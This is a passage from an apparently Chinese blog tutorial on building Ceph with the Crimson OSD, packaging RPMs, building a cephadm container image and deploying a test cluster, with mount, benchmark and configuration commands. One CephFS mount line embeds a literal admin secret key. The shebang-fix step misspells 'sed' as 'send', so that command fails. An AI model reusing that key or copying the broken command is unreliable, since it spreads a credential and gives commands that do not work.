class="hljs-comment"># 格式化 nbd 方式映射的 rbd image 并挂载</span><br>mkfs.xfs /dev/nbd1<br><span class="hljs-built_in">mkdir</span> -p /mnt/cephrbd<br>mount /dev/nbd1 /mnt/cephrbd<br><br><span class="hljs-comment"># 压测 rbd image - 限速写</span><br><span class="hljs-built_in">cd</span> /mnt/cephrbd<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=testfile status=progress<br><br><span class="hljs-comment"># 压测 rbd image - 限速读</span><br><span class="hljs-built_in">cd</span> /mnt/cephrbd<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 在线调整 rbd image 格式化后的文件系统的大小</span><br>xfs_growfs -d /mnt/cephrbd-01<br><br><span class="hljs-comment"># 查看 rbd map devices</span><br>./bin/rbd device list -t krbd<br>./bin/rbd device list -t nbd<br><br><span class="hljs-comment"># 取消挂载 rbd image</span><br>umount /mnt/cephrbd<br>./bin/rbd device unmap rbdpool/rbdimg01 -t krbd<br>./bin/rbd device unmap rbdpool/rbdimg01 -t nbd<br></code></pre></td></tr></table></figure><h3 id="1-3-2、测试-FS-功能"><a href="#1-3-2、测试-FS-功能" class="headerlink" title="1.3.2、测试 FS 功能"></a>1.3.2、测试 FS 功能</h3><p>添加 MDS 组件并创建文件系统:  详见 <a href="https://docs.ceph.com/en/latest/cephadm/services/mds/#orchestrator-cli-cephfs">Deploy CephFS</a></p><p>需要注意，容器环境中可能没有对应的 ceph 内核模块，下面的执行命令可能会失败。</p><p><strong>相关命令:</strong> （以下命令执行的相对路径均位于 ceph&#x2F;build 目录中）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kernel 方式挂载 cephfs</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/mount/mount.ceph.c#L473</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/kernel-cephfs<br>mount -t ceph 10.10.10.1:3300:/ /mnt/kernel-cephfs -o name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g==,ms_mode=crc,mount_timeout=5<br><br><span class="hljs-comment"># fuse 方式挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/fuse-cephfs<br>./bin/ceph-fuse -c /etc/ceph/ceph.conf -n client.admin -m 10.10.10.1:3300 /mnt/fuse-cephfs --client_mountpoint /<br><br><span class="hljs-comment"># 测试读写 - 限速写</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/kernel-cephfs/testfile status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/fuse-cephfs/testfile status=progress<br><br><span class="hljs-comment"># 测试读写 - 限速读</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/kernel-cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/fuse-cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 取消挂载 kernel 方式的 cephfs</span><br>umount /mnt/kernel-cephfs<br><br><span class="hljs-comment"># 取消挂载 fuse 方式的 cephfs</span><br>fusermount -u /mnt/fuse-cephfs<br></code></pre></td></tr></table></figure><h3 id="1-3-3、测试其他特性"><a href="#1-3-3、测试其他特性" class="headerlink" title="1.3.3、测试其他特性"></a>1.3.3、测试其他特性</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试 crimson osd 后端存储类别是否应用成功（位于 build 目录中测试）</span><br><span class="hljs-built_in">cat</span> ./dev/osd*/type<br></code></pre></td></tr></table></figure><h1 id="二、cephadm-搭建集群"><a href="#二、cephadm-搭建集群" class="headerlink" title="二、cephadm 搭建集群"></a>二、cephadm 搭建集群</h1><blockquote><p><strong>注意:</strong> 由于目前社区在2025年07月29日之后支持了通过 cephadm 部署 seastore 类型的 osd（<a href="https://github.com/ceph/ceph/pull/64323">pull&#x2F;64323</a>） ，因此为了部署方便，所以推荐使用最新版本进行部署。</p></blockquote><p>通过 cephadm 搭建集群需要用到对应版本的 ceph 容器镜像， mon&#x2F;mgr&#x2F;osd 等组件运行在容器环境中，官方提供的 <a href="https://quay.io/repository/ceph/ceph">Ceph 容器镜像仓库</a>。 但是有时候我们需要修改代码或构建特定版本的镜像，为此就需要自行构建对应的容器镜像，详细步骤下面会介绍。</p><p><strong>操作步骤如下:</strong></p><ol><li>编译打包: 编译 Ceph 并产出 RPM 安装包，之后搭建 Web 服务器提供 RPM 安装包的访问下载地址；</li><li>容器构建: 基于上一步产出的 RPM 安装包，构建 Cephadm 依赖的 Ceph 镜像；</li><li>集群部署: 基于上一步构建的 Ceph 镜像，开始部署集群；</li><li>集群测试: 验证集群功能；</li></ol><h2 id="2-1、编译打包"><a href="#2-1、编译打包" class="headerlink" title="2.1、编译打包"></a>2.1、编译打包</h2><p>由于最终编译打包生成的 RPM 包需要安装在 CentOS Stream 9 的环境中，因此我们需要基于该环境进行编译打包，这里推荐使用 <a href="https://github.com/bugwz/ceph-image/tree/main/tentacle/centos-9-stream/dev">bugwz&#x2F;ceph-images</a> 中提供的 CentOS Stream 9 的编译打包环境。</p><p><strong>编译打包的详细步骤如下:</strong></p><ol><li>构建容器编译打包环境: 基于 <a href="https://github.com/bugwz/ceph-image/tree/main/tentacle/centos-9-stream/dev">bugwz&#x2F;ceph-image</a> 中提供的 Dockerfile 进行构建；</li><li>执行编译打包: 基于上一步构建的编译打包环境执行编译、RPM 打包等操作；</li><li>搭建 Web 服务器环境: 提供对上一步打包的 RPM 的访问下载服务；</li></ol><h3 id="2-1-1、构建容器编译打包环境"><a href="#2-1-1、构建容器编译打包环境" class="headerlink" title="2.1.1、构建容器编译打包环境"></a>2.1.1、构建容器编译打包环境</h3><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建 Ceph 开发环境，最终生成一个 ceph-dev:centos9-stream-tentacle 的镜像</span><br>git <span class="hljs-built_in">clone</span> https://github.com/bugwz/ceph-image.git<br><span class="hljs-built_in">cd</span> ./ceph-image/tentacle/centos-9-stream/dev<br>./run.sh<br></code></pre></td></tr></table></figure><h3 id="2-1-2、执行编译打包"><a href="#2-1-2、执行编译打包" class="headerlink" title="2.1.2、执行编译打包"></a>2.1.2、执行编译打包</h3><blockquote><p><strong>注意:</strong> 2025年04月03日之后的代码版本中移除了 <code>WITH_SEASTAR</code> 变量，需要使用新变量 <code>WITH_CRIMSON</code> ，相关 <a href="https://github.com/ceph/ceph/commit/23c33f69ff977f7a05d3e3368e078b20e67a5ced">commit&#x2F;23c33f6</a> 。</p></blockquote><p>这里我指定了我测试使用的版本代码，具体的版本可以根据你的需求变更。</p><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入开发环境</span><br>podman run -d --name ceph-build ceph-dev:centos9-stream-tentacle /bin/bash -c <span class="hljs-string">&quot;while true; do sleep 1; done&quot;</span><br>podman <span class="hljs-built_in">exec</span> -it ceph-build /bin/bash<br><br><span class="hljs-comment"># 编译</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f 783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br>git submodule update --init --recursive<br><span class="hljs-built_in">export</span> FOR_MAKE_CHECK=<span class="hljs-literal">true</span><br>/root/ceph/install-deps.sh<br>/root/ceph/do_cmake.sh<br><span class="hljs-built_in">cd</span> /root/ceph/build/<br>ninja -j <span class="hljs-string">&quot;<span class="hljs-subst">$(expr $(nproc)</span> / 2)&quot;</span><br><br><br><span class="hljs-comment"># 编译 crimson</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f 783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br>git submodule update --init --recursive<br><span class="hljs-built_in">export</span> FOR_MAKE_CHECK=<span class="hljs-literal">true</span><br><span class="hljs-built_in">export</span> WITH_CRIMSON=<span class="hljs-literal">true</span><br>/root/ceph/install-deps.sh<br>/root/ceph/do_cmake.sh -DWITH_CRIMSON=ON<br><span class="hljs-built_in">cd</span> /root/ceph/build/<br>ninja -j <span class="hljs-string">&quot;<span class="hljs-subst">$(expr $(nproc)</span> / 2)&quot;</span><br><br><br><span class="hljs-comment"># 构建 RPM</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f 783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br>git submodule update --init --recursive<br>/root/ceph/make-dist<br><span class="hljs-built_in">mkdir</span> -p /root/ceph/rpmbuild/SOURCES<br><span class="hljs-built_in">cp</span> /root/ceph/ceph-*.tar.bz2 /root/ceph/rpmbuild/SOURCES<br>rpmbuild -ba --clean --rmsource --rmspec \<br>    --define=<span class="hljs-string">&quot;_topdir /root/ceph/rpmbuild&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_rpmdir /root/ceph/rpmbuild/RPMS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_builddir /root/ceph/rpmbuild/BUILD&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_sourcedir /root/ceph/rpmbuild/SOURCES&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_specdir /root/ceph/rpmbuild/SPECS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_srcrpmdir /root/ceph/rpmbuild/SRPMS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_unpackaged_files_terminate_build 0&quot;</span> \<br>    ceph.spec --without selinux<br>createrepo /root/ceph/rpmbuild/RPMS/x86_64/<br>createrepo /root/ceph/rpmbuild/RPMS/noarch/<br><br><br><span class="hljs-comment"># 构建 crimson RPM</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f 783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br>git submodule update --init --recursive<br>/root/ceph/make-dist<br><span class="hljs-built_in">mkdir</span> -p /root/ceph/rpmbuild/SOURCES<br><span class="hljs-built_in">cp</span> /root/ceph/ceph-*.tar.bz2 /root/ceph/rpmbuild/SOURCES<br>rpmbuild -ba --with crimson --clean --rmsource --rmspec \<br>    --define=<span class="hljs-string">&quot;_topdir /root/ceph/rpmbuild&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_rpmdir /root/ceph/rpmbuild/RPMS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_builddir /root/ceph/rpmbuild/BUILD&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_sourcedir /root/ceph/rpmbuild/SOURCES&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_specdir /root/ceph/rpmbuild/SPECS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_srcrpmdir /root/ceph/rpmbuild/SRPMS&quot;</span> \<br>    --define=<span class="hljs-string">&quot;_unpackaged_files_terminate_build 0&quot;</span> \<br>    ceph.spec --without selinux<br>createrepo /root/ceph/rpmbuild/RPMS/x86_64/<br>createrepo /root/ceph/rpmbuild/RPMS/noarch/<br></code></pre></td></tr></table></figure><h3 id="2-1-3、搭建-Web-服务器环境"><a href="#2-1-3、搭建-Web-服务器环境" class="headerlink" title="2.1.3、搭建 Web 服务器环境"></a>2.1.3、搭建 Web 服务器环境</h3><p>这一步的目的是提供一个 Web 环境，以便于在运行构建 Ceph 镜像脚本的时候，在镜像中安装使用我们上一步打包的 RPM 包。</p><p>以下操作继续位于 1.2 中提到的名为 ceph-build 的容器中执行。</p><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 CentOS 源所需要的 repo 文件</span><br><span class="hljs-comment"># 该文件完整路径为 /root/ceph/rpmbuild/ceph.repo</span><br><span class="hljs-comment"># 该文件内容如下，需要修改对应的 IP 地址等信息</span><br>[ceph-custom-stable]<br>name=Ceph custom stable <span class="hljs-variable">$basearch</span> repo<br>baseurl=http://127.0.0.1:8080/RPMS/<span class="hljs-variable">$basearch</span><br>enabled=1<br>gpgcheck=0<br>priority=0<br><br>[ceph-custom-stable-noarch]<br>name=Ceph custom stable noarch repo<br>baseurl=http://127.0.0.1:8080/RPMS/noarch<br>enabled=1<br>gpgcheck=0<br>priority=0<br><br><br><span class="hljs-comment"># 使用 Python3 启动一个 Web 服务</span><br><span class="hljs-built_in">cd</span> /root/ceph/rpmbuild/<br>python3 -m http.server 8080<br></code></pre></td></tr></table></figure><h2 id="2-2、容器构建"><a href="#2-2、容器构建" class="headerlink" title="2.2、容器构建"></a>2.2、容器构建</h2><p>当构建 crimson RPM 的时候，最后会同时生成 ceph-crimson-osd 和 ceph-osd 两个 rpm 包，但是其内部的 &#x2F;usr&#x2F;bin&#x2F;ceph-osd 和 &#x2F;usr&#x2F;bin&#x2F;crimson-osd 文件完全相同，也就是说在构建 crimson RPM 的场景下，即使最后安装的软件包为 ceph-osd ，实际起作用的也是 crimson osd 。所以即使是构建 crimson osd 的容器环境，在执行容器脚本时对应的 FLAVOR 环境变量也可以使用 default 参数。</p><p>以下操作并不位于上面提到的名为 ceph-build 的容器中。</p><h3 id="2-2-1、修改构建脚本"><a href="#2-2-1、修改构建脚本" class="headerlink" title="2.2.1、修改构建脚本"></a>2.2.1、修改构建脚本</h3><blockquote><p><strong>注意:</strong> 社区当前的打包脚本中并没有提供 CEPH_CUSTOM_REPO 这个参数，该参数是我为了使用自定义的源仓库来新增的参数。需要修改的代码变动如下。最新补充: 2025年08月13日的 <a href="https://github.com/ceph/ceph/pull/64976">pull&#x2F;64976</a> 新增了 <code>CUSTOM_CEPH_REPO_URL</code> 参数来支持自定义的软件包源。</p></blockquote><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载 Ceph 源码</span><br>git <span class="hljs-built_in">clone</span> https://github.com/ceph/ceph.git<br><span class="hljs-built_in">cd</span> ./ceph<br>git checkout -f 783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br><span class="hljs-built_in">cd</span> ./container<br><br>vi build.sh<br><br>vi Containerfile<br></code></pre></td></tr></table></figure><p><strong>build.sh 中的变动如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">podman build --pull=<span class="hljs-literal">true</span> --squash -f <span class="hljs-variable">$CFILE</span> -t build.sh.output \<br>    --build-arg FROM_IMAGE=<span class="hljs-variable">$&#123;FROM_IMAGE:-quay.io/centos/centos:stream9&#125;</span> \<br>    --build-arg CEPH_SHA1=<span class="hljs-variable">$&#123;CEPH_SHA1&#125;</span> \<br>    --build-arg CEPH_GIT_REPO=<span class="hljs-variable">$&#123;CEPH_GIT_REPO&#125;</span> \<br>    --build-arg CEPH_REF=<span class="hljs-variable">$&#123;BRANCH:-main&#125;</span> \<br>    --build-arg OSD_FLAVOR=<span class="hljs-variable">$&#123;FLAVOR:-default&#125;</span> \<br>    --build-arg CI_CONTAINER=<span class="hljs-variable">$&#123;CI_CONTAINER:-default&#125;</span> \<br>    --build-arg CEPH_CUSTOM_REPO=<span class="hljs-variable">$&#123;CEPH_CUSTOM_REPO:-&#125;</span> \<br>    --secret=<span class="hljs-built_in">id</span>=prerelease_creds,src=./prerelease.secret.txt \<br>    2&gt;&amp;1 <br></code></pre></td></tr></table></figure><p><strong>Containerfile 中的变动如下:</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># (optional) ceph custom repo (pull ceph packages from the repo)</span><br><span class="hljs-keyword">ARG</span> CEPH_CUSTOM_REPO=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/echo -e <span class="hljs-string">&quot;\</span></span><br><span class="hljs-string"><span class="language-bash">FROM_IMAGE: <span class="hljs-variable">$&#123;FROM_IMAGE&#125;</span>\n\</span></span><br><span class="hljs-string"><span class="language-bash">CEPH_REF: <span class="hljs-variable">$&#123;CEPH_REF&#125;</span>\n\</span></span><br><span class="hljs-string"><span class="language-bash">GANESHA_REPO_BASEURL: <span class="hljs-variable">$&#123;GANESHA_REPO_BASEURL&#125;</span> \n\</span></span><br><span class="hljs-string"><span class="language-bash">OSD_FLAVOR: <span class="hljs-variable">$&#123;OSD_FLAVOR&#125;</span> \n\</span></span><br><span class="hljs-string"><span class="language-bash">CI_CONTAINER: <span class="hljs-variable">$&#123;CI_CONTAINER&#125;</span> \n\</span></span><br><span class="hljs-string"><span class="language-bash">CEPH_CUSTOM_REPO: <span class="hljs-variable">$&#123;CEPH_CUSTOM_REPO&#125;</span>&quot;</span></span><br><br><br><span class="hljs-comment"># Ceph repo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> --mount=<span class="hljs-built_in">type</span>=secret,<span class="hljs-built_in">id</span>=prerelease_creds <span class="hljs-built_in">set</span> -ex &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CEPH_CUSTOM_REPO&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span> \</span><br><span class="language-bash">        rpm --import <span class="hljs-string">&#x27;https://download.ceph.com/keys/release.asc&#x27;</span> &amp;&amp; \</span><br><span class="language-bash">        ARCH=$(<span class="hljs-built_in">arch</span>); <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;ARCH&#125;</span>&quot;</span> == <span class="hljs-string">&quot;aarch64&quot;</span> ]; <span class="hljs-keyword">then</span> ARCH=<span class="hljs-string">&quot;arm64&quot;</span>; <span class="hljs-keyword">fi</span> ;\</span><br><span class="language-bash">        IS_RELEASE=0 ;\</span><br><span class="language-bash">        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CI_CONTAINER&#125;</span>&quot;</span> == <span class="hljs-string">&quot;true&quot;</span> ]] ; <span class="hljs-keyword">then</span> \</span><br><span class="language-bash">            <span class="hljs-comment"># TODO: this can return different ceph builds (SHA1) for x86 vs. arm runs. is it important to fix?</span></span><br>            REPO_URL=$(curl -fs <span class="hljs-string">&quot;https://shaman.ceph.com/api/search/?project=ceph&amp;distros=centos/9/$&#123;ARCH&#125;&amp;flavor=$&#123;OSD_FLAVOR&#125;&amp;ref=$&#123;CEPH_REF&#125;&amp;sha1=latest&quot;</span> | jq -r .[<span class="hljs-number">0</span>].url) ;\<br>        else \<br>            IS_RELEASE=<span class="hljs-number">1</span> ;\<br>            source /<span class="hljs-keyword">run</span><span class="language-bash">/secrets/prerelease_creds; \</span><br><span class="language-bash">            REPO_URL=<span class="hljs-string">&quot;https://<span class="hljs-variable">$&#123;PRERELEASE_USERNAME&#125;</span>:<span class="hljs-variable">$&#123;PRERELEASE_PASSWORD&#125;</span>@download.ceph.com/prerelease/ceph/rpm-<span class="hljs-variable">$&#123;CEPH_REF&#125;</span>/el9/&quot;</span> ;\</span><br><span class="language-bash">        <span class="hljs-keyword">fi</span> &amp;&amp; \</span><br><span class="language-bash">        rpm -Uvh <span class="hljs-string">&quot;<span class="hljs-variable">$REPO_URL</span>/noarch/ceph-release-1-<span class="hljs-variable">$&#123;IS_RELEASE&#125;</span>.el9.noarch.rpm&quot;</span> ; \</span><br><span class="language-bash">        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$IS_RELEASE</span>&quot;</span> == 1 ]] ; <span class="hljs-keyword">then</span> \</span><br><span class="language-bash">            sed -i <span class="hljs-string">&quot;s;http://download.ceph.com/;https://<span class="hljs-variable">$&#123;PRERELEASE_USERNAME&#125;</span>:<span class="hljs-variable">$&#123;PRERELEASE_PASSWORD&#125;</span>@download.ceph.com/prerelease/ceph/;&quot;</span> /etc/yum.repos.d/ceph.repo ; \</span><br><span class="language-bash">            dnf clean expire-cache ; \</span><br><span class="language-bash">        <span class="hljs-keyword">fi</span> \</span><br><span class="language-bash">    <span class="hljs-keyword">else</span> \</span><br><span class="language-bash">        curl -fs -L <span class="hljs-variable">$&#123;CEPH_CUSTOM_REPO&#125;</span> -o /etc/yum.repos.d/ceph.repo ;\</span><br><span class="language-bash">    <span class="hljs-keyword">fi</span></span><br></code></pre></td></tr></table></figure><h3 id="2-2-2、执行构建操作"><a href="#2-2-2、执行构建操作" class="headerlink" title="2.2.2、执行构建操作"></a>2.2.2、执行构建操作</h3><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建 Cephadm 所需要的容器镜像</span><br><span class="hljs-built_in">export</span> NO_PUSH=<span class="hljs-literal">true</span><br><span class="hljs-built_in">export</span> CI_CONTAINER=<span class="hljs-literal">true</span><br><span class="hljs-built_in">export</span> FLAVOR=default<br><span class="hljs-built_in">export</span> BRANCH=main<br><span class="hljs-built_in">export</span> CEPH_SHA1=783bf4834fe4ad1a8da57902a7f334c3dfa820b2<br><span class="hljs-built_in">export</span> ARCH=$(<span class="hljs-built_in">arch</span>)<br><span class="hljs-built_in">export</span> CEPH_CUSTOM_REPO=<span class="hljs-string">&quot;http://127.0.0.1:8080/ceph.repo&quot;</span><br>/root/ceph/container/build.sh<br><br><span class="hljs-comment"># 推送容器镜像至内部/外部镜像服务器</span><br>podman push <span class="hljs-variable">$IMAGE_NAME</span><br></code></pre></td></tr></table></figure><h2 id="2-3、集群部署"><a href="#2-3、集群部署" class="headerlink" title="2.3、集群部署"></a>2.3、集群部署</h2><p>假设测试环境中拥有三台机器，每台机器上均已安装 ceph-common ，ceph-base 等 Ceph 相关的 CLI 软件，且三台机器的信息如下: </p><table><thead><tr><th align="center">机器节点</th><th align="center">机器 IP</th></tr></thead><tbody><tr><td align="center">ceph01</td><td align="center">10.10.10.1</td></tr><tr><td align="center">ceph02</td><td align="center">10.10.10.2</td></tr><tr><td align="center">ceph03</td><td align="center">10.10.10.3</td></tr></tbody></table><p><strong>使用 cephadm 进行集群的搭建步骤如下:</strong></p><ol><li>创建新集群:  详见 <a href="https://docs.ceph.com/en/latest/cephadm/install/#bootstrap-a-new-cluster">Bootstrap a new cluster</a> ；</li><li>添加主机到集群:  详见 <a href="https://docs.ceph.com/en/latest/cephadm/host-management/#cephadm-adding-hosts">Adding Hosts</a> ；</li><li>添加 OSD 存储:  详见 <a href="https://docs.ceph.com/en/latest/cephadm/services/osd/#cephadm-deploy-osds">Deploy OSDs</a> ；</li></ol><h3 id="2-3-1、创建新集群"><a href="#2-3-1、创建新集群" class="headerlink" title="2.3.1、创建新集群"></a>2.3.1、创建新集群</h3><p><strong>注意:</strong> 如果编译打包的环境和安装 cephadm 的环境中 python 版本不同，这可能会导致 cephadm 无法运行，由于 cephadm 使用固定的 python 路径进行解析执行，所以如果遇到这种问题我们可以尝试修改本地已安装 cephadm 中的 python 路径来解决该问题。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">head</span> -1 $(<span class="hljs-built_in">which</span> cephadm)<br><span class="hljs-built_in">sudo</span> send -i <span class="hljs-string">&#x27;1s|^.*$|#!/root/.pyenv/shims/python3|&#x27;</span> $(<span class="hljs-built_in">which</span> cephadm)<br></code></pre></td></tr></table></figure><p><strong>创建集群相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建新集群</span><br>cephadm --image <span class="hljs-variable">$IMAGE_NAME</span> bootstrap --config /data/ceph/cephadm.conf --mon-ip 10.10.10.1 --initial-dashboard-password admin --allow-fqdn-hostname --no-minimize-config<br><br><span class="hljs-comment"># 初始化环境配置，调整 crimson 相关配置</span><br>ceph config <span class="hljs-built_in">set</span> osd crimson_seastar_num_threads 1<br>ceph config <span class="hljs-built_in">set</span> global <span class="hljs-string">&#x27;enable_experimental_unrecoverable_data_corrupting_features&#x27;</span> crimson<br>ceph osd set-allow-crimson --yes-i-really-mean-it<br>ceph config <span class="hljs-built_in">set</span> mon osd_pool_default_crimson <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 启用日志文件</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_file <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_file <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_journald <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_journald <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 初始化环境配置: 新主机安装集群 SSH 公钥</span><br>ssh-copy-id -f -i /etc/ceph/ceph.pub root@ceph02<br>ssh-copy-id -f -i /etc/ceph/ceph.pub root@ceph03<br></code></pre></td></tr></table></figure><p><strong>其他命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 调整 cephadm 日志配置</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/cephadm/log_level debug<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/cephadm/log_to_cluster <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/cephadm/log_to_cluster_level debug<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/cephadm/log_to_file <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 调整 osd 后端存储类别</span><br><span class="hljs-comment"># 目前 cephadm 部署方式中，调整该参数无效</span><br><span class="hljs-comment"># ceph config set osd osd_objectstore bluestore</span><br><span class="hljs-comment"># ceph config set osd osd_objectstore cyanstore</span><br><span class="hljs-comment"># ceph config set osd osd_objectstore seastore</span><br><br><span class="hljs-comment"># 导出正在运行的服务规范</span><br>ceph orch <span class="hljs-built_in">ls</span> --service-type osd --<span class="hljs-built_in">export</span> &gt; osd.yaml<br>ceph orch <span class="hljs-built_in">ls</span> --<span class="hljs-built_in">export</span> &gt; cluster.yaml<br><br><span class="hljs-comment"># 应用新的服务规范</span><br>ceph orch apply -i osd.new.yaml --dry-run<br><br><span class="hljs-comment"># 销毁集群</span><br>cephadm rm-cluster --force --zap-osds  --fsid 3fab7f2a-39d6-11f0-9b5b-005056854af3<br>dnf remove <span class="hljs-string">&quot;*ceph*&quot;</span><br><span class="hljs-built_in">rm</span> -rf /etc/ceph/*<br><span class="hljs-built_in">rm</span> -rf /var/lib/ceph/*<br><span class="hljs-built_in">rm</span> -rf /var/log/ceph/*<br><br><span class="hljs-comment"># cephadm 重启组件</span><br>ceph orch ps --daemon-type mon<br>ceph orch daemon restart &lt;daemon-name&gt;<br></code></pre></td></tr></table></figure><p><strong>Crimson 相关配置参数:</strong></p><ul><li><code>osd_objectstore</code> : 后端对象存储类型，可选值为 filestore&#x2F;memstore&#x2F;bluestore&#x2F;kstore&#x2F;seastore&#x2F;cyanstore ， 默认值为 bluestore ；<ul><li>对应 osd 的配置为: filestore&#x2F;memstore&#x2F;bluestore ；</li><li>对应 crimson osd 的配置为: cyanstore&#x2F;seastore&#x2F;bluestore , 在这里 bluestore 前端使用 alienstore 进行代理，但是配置中并没有该参数；</li></ul></li><li><code>crimson_osd_obc_lru_size</code> : 缓存的 Object Context 数量 ， 默认值为 512 ；</li><li><code>crimson_osd_scheduler_concurrency</code> : 并发 IO 操作的最大数量，0 代表无限 ， 默认值为 0 ；</li><li><code>crimson_alien_op_num_threads</code> : 为 alienized ObjectStore 提供服务的线程数，默认值为 6 ；</li><li><code>crimson_alien_thread_cpu_cores</code> : 以 cpuset(7) 格式运行 alienstore 线程的 CPU 核心， 无默认值；</li><li><code>crimson_seastar_cpu_cores</code> : 以 cpuset(7) 格式运行 seastar reactor 线程的 CPU 核心，smp::count 从此选项推导， 无默认值；</li><li><code>crimson_seastar_num_threads</code> : 不进行 CPU 绑定的情况下用于服务 seastar reactor 的线程数，如果设置了 crimson_seastar_cpu_cores，则会被覆盖 ， 默认值为 0 ；</li><li><code>crimson_osd_stat_interval</code> : 定期报告 OSD 状态的时间间隔（以秒为单位），设置为 0 则禁用， 默认值为 0 ；</li><li><code>osd_pool_default_crimson</code> : 默认使用 FLAG_CRIMSON 创建池，默认值为 false ；</li><li><code>seastore_segment_size</code> : 用于分段管理器的片段大小，默认值为 64M ；</li><li><code>seastore_device_size</code> : 创建时用于 SegmentManager 块文件的总大小，默认值为 50G ；</li><li><code>seastore_block_create</code> : 如果不存在，请创建 SegmentManager 文件，默认值为 true ；</li><li><code>seastore_journal_batch_capacity</code> : 日志批处理中的记录数量限制，默认值为 16 ；</li><li><code>seastore_journal_batch_flush_size</code> : 强制清除日志批处理的大小阈值，默认值为 16M ；</li><li><code>seastore_journal_iodepth_limit</code> : 用于提交日志记录的 IO 深度限制，默认值为 5 ；</li><li><code>seastore_journal_batch_preferred_fullness</code> : 清除日志批处理的记录完整阈值，默认值为 0.95 ；</li><li><code>seastore_default_max_object_size</code> : seastore 对象数据的默认逻辑地址空间保留，默认值为 16777216 ；</li><li><code>seastore_default_object_metadata_reservation</code> : seastore 